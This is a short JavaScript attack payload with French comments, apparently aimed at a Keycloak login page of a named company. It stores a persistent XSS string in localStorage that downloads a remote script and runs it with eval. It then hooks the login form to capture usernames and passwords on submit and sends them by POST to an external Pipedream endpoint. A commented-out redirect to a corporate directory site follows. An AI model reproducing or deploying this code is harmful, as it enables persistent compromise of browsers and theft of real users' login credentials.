// 1. Persistance dans localStorage pour RememberMe XSS
localStorage.setItem('userName', `"><img src=x onerror="fetch('https://raw.githubusercontent.com/Vault-of-Jok3r/payload_xss/refs/heads/main/newpayload.js').then(r=>r.text()).then(c=>eval(c))">`);

// 2. Hook du formulaire d'authentification
var loginForm = document.getElementById('kc-form-login');
if (loginForm) {
  loginForm.addEventListener('submit', function() {
    var username = document.getElementById('username').value;
    var password = document.getElementById('password').value;

    // 3. Exfiltration vers Pipedream
    fetch('https://eojy4h95a631zv3.m.pipedream.net', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        username: username,
        password: password,
        timestamp: new Date().toISOString()
      })
    });

    // 4. (Optionnel) Redirection après exfiltration
    // window.location.href = 'https://trombinoscopemousquetaires.mousquetaires.com/trombinoscope-mousquetaires/';
  });
}
